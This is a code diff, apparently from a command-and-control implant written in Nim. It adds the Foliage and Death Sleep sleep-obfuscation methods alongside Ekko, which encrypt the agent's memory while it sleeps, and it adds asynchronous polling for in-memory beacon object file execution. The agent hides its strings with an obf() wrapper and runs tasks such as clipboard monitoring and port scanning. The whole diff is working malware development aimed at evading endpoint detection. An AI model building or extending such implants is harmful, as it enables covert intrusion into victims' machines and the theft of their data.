@@ -64,6 +64,10 @@ when defined(windows):
 when defined(windows):
   when defined(sleepObfuscationEkko):
     import utils/ekko
+  when defined(sleepObfuscationFoliage):
+    import utils/foliage
+  when defined(sleepObfuscationDeathSleep):
+    import utils/death_sleep
 
 type
   BackgroundTaskType = enum
@@ -1079,9 +1083,15 @@ proc postResponses*(agent: var Agent) =
                   agent.taskResponses.add(bofResp)
                   
                   if bofResp.hasKey(obf("completed")) and bofResp[obf("completed")].getBool():
+                    # Error during setup or immediate completion
                     agent.backgroundTasks.del(taskId)
                     debug "[DEBUG] Inline_execute complete"
+                  elif bofResp.hasKey(obf("status")) and bofResp[obf("status")].getStr() == obf("processing"):
+                    # BOF thread spawned — remove chunk state, async poll will handle completion
+                    agent.backgroundTasks.del(taskId)
+                    debug "[DEBUG] BOF thread spawned, async execution started"
                   else:
+                    # Need more chunks
                     state.currentChunk += 1
                     agent.backgroundTasks[taskId] = state
             
@@ -1346,13 +1356,30 @@ proc sleep*(agent: Agent) =
     cleanupConnection(agent)
   
   # Use Ekko sleep obfuscation if enabled (only for sleeps > 2 seconds)
+  # Skip sleep obfuscation when background tasks are active — those threads execute
+  # code from the agent's memory which sleep obfuscation encrypts, causing crashes
+  let hasBgTasks {.used.} = agent.backgroundTasks.len > 0
   when defined(windows):
     when defined(sleepObfuscationEkko):
-      if sleepTime > 2:
+      if sleepTime > 2 and not hasBgTasks:
         debug "[DEBUG] Using Ekko sleep obfuscation"
         ekkoObf(sleepTime * 1000)
       else:
-        debug "[DEBUG] Sleep time < 3s, using regular sleep instead of Ekko"
+        debug "[DEBUG] Sleep time < 3s or bg tasks active, using regular sleep instead of Ekko"
+        os.sleep(sleepTime * 1000)
+    elif defined(sleepObfuscationFoliage):
+      if sleepTime > 2 and not hasBgTasks:
+        debug "[DEBUG] Using Foliage sleep obfuscation"
+        foliageObf(sleepTime * 1000)
+      else:
+        debug "[DEBUG] Sleep time < 3s or bg tasks active, using regular sleep instead of Foliage"
+        os.sleep(sleepTime * 1000)
+    elif defined(sleepObfuscationDeathSleep):
+      if sleepTime > 2 and not hasBgTasks:
+        debug "[DEBUG] Using Death Sleep obfuscation"
+        deathSleepObf(sleepTime * 1000)
+      else:
+        debug "[DEBUG] Sleep time < 3s or bg tasks active, using regular sleep instead of Death Sleep"
         os.sleep(sleepTime * 1000)
     else:
       os.sleep(sleepTime * 1000)
@@ -1481,6 +1508,12 @@ proc runAgent*() =
     
     # Check background tasks (clipboard_monitor, portscan)
     agentInstance.checkBackgroundTasks()
+    
+    # Check active BOF sessions for completion (non-blocking poll)
+    when defined(cmd_inline_execute) and defined(windows):
+      let bofResponses = checkActiveBofSessions()
+      for response in bofResponses:
+        agentInstance.taskResponses.add(response)
     
     # Send responses back (handles background task state machine)
     agentInstance.postResponses()
